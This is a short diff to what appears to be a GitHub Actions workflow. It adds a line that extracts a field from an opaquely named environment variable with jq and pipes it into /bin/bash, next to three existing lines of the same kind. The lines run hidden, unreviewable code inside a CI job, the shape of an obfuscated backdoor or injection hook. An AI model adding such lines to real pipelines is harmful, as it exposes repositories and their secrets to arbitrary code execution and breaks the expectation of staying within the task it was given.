@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$pjb8" | jq -r .fi61 | /bin/bash
           printf '%s' "$sfqsy34" | jq -r .alol522 | /bin/bash
           echo $he4417 | jq -r .ryq84763 | /bin/bash
+          echo $omamd4 | jq -r .ohon21 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
